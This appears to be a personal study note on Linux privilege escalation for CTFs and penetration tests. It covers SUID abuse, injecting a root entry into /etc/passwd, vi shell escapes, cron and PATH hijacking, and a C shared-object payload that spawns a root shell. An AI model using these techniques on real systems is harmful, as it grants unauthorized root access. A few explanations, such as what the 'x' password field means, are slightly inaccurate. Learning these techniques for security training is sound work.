# What is Priviledge Escalation?
 Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

#  Why is it important?
 Rarely when doing a [CTF](<https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)>) or [Penetration test](https://en.wikipedia.org/wiki/Penetration_test), would you be able to get root access to machines. Privilege escalation is crucial, because it lets you gain system administrator levels of access. This allow you to do many things, including:
 > Reset passwords  
 > Bypass access controls to compromise protected data
 > Edit software configurations
 > Enable persistence, so you can access the machine again later.
 > Change privilege of users


### Listed below are some of the most common priviledge escalation attacks:
#### 1. Abusing SUID/GUID Files
The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges! 

The permissions to look for when looking for SUID is:
`rws-rwx-rwx`
SUID Binaries can be found manually using the following command:
 `find / -type f -perm -u=s 2>/dev/null`
######  More on this later!

#### 2. Exploiting Writeable /etc/passwd
The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a **plain text file**.
The /etc/passwd file should have general read permission; write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, we have the vulnerability that can allow the **creation of a root user that we can access.**

Each entry in the /etc/passwd file follows this format:
`test:x:0:0:root:/root:/bin/bash`
Here, **x** denotes the password hash of user **test**.

##### Exploit:
Before you create a new user, you need to create a compliant password hash to use.
`openssl passwd -1 -salt [salt] [password]`
Eg: This is the hash created with the salt *new* and password *123*:
			`$1$new$p7ptkEKU1HnaHpRtzNizS1`
		Now, we'll add a new entry to /etc/passwd with the username *new*
			`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

All that is left is to `sudo su`  into the *new* user we just created, and you should be greeted by a root prompt!

#### 3. Escaping Vi Editor
 Every time you have access to an account during a CTF scenario, you should use **"sudo -l"** to list what commands you're able to use as a super user on that account. The commands listed are called as binaries, and these can be exploited easily using cheat sheets from [GTFO Bins](https://gtfobins.github.io/) .

```
user8@polobox:~$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
```

From the above snippet, it can be seen that **user8** can run **vi** command as sudo without the password. 
  So, all we need to do is open vi as root, by typing **"sudo vi"** into the terminal. Now, type `:!sh` to open a shell as root.

#### 4.  Exploiting Crontab
Cron [daemon](<https://en.wikipedia.org/wiki/Daemon_(computing)>) is a long-running process that executes commands at specific time. This can be used to schedule tasks, either as one time events, or recurring tasks. 
`cat /etc/crontab` command can be used to check what cron jobs are active.
Format for cronjobs:
`17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly`

##### Exploit:

![[Pasted image 20220908092843.png]]

From the above screenshot, it can be seen that `autoscript.sh` runs every 5 minutes with **root** permission.

#### 5. Exploiting PATH Variable
PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.
##### Exploit:
Let's say we have an SUID binary. By running it, it calls the system shell to do a basic task like list the current runing processes with `ps`.
We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Let's take an instance where the SUID binary is executing command `ls`.
Now, change the directory to `/tmp` and create an imitation executable.
 `echo "/bin/bash" > ls`
 
Make the file executable with `chmod +x ls`
Now, change the path variable so that it points directly to where the executable is stored.
**export PATH=/tmp:$PATH**
This will cause you to open a bash promt everytime you run the command `ls`. So before you finish the exploit, use `/bin/ls` where the real **ls** executable is.

##### 6. SUID/GUID Shared Object Injection:
This exploit can be best explained with a real life example.

Consider an SUID executable in the system discovered using  `find / -type f -perm -u=s 2>/dev/null` command. 

From the machine, we can see that the executable displays a progress bar before exiting.

![[Pasted image 20220908231740.png]]

Run **[strace](https://linuxhint.com/use-linux-strace-command/#:~:text=The%20%E2%80%9Cstrace%E2%80%9D%20command%20is%20a,to%20troubleshoot%20the%20program%20issues.)** on the file and search the output for open/access calls and for "no such file" errors:
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

![[Pasted image 20220908231945.png]]

Here, the executable tries to load a file named libcalc.so from `/home/user/.config`, but it cannot be found.
Create a *.config* directory. This is where we'll be uploading our own *fake* *libcalc.so* file which will run a shell.
`mkdir /home/user/.config`
Below is the code for the shell:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}

```
Save the file as *libcalc.c* and compile the code into a shared object at the location the **suid-so** executable was looking for it: *( /home/user/tools/suid/libcalc.c)*

> gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

Now, when we execute the *suid-so* file again, we get a shell instead of the progress bar!

![[Pasted image 20220908232917.png]]

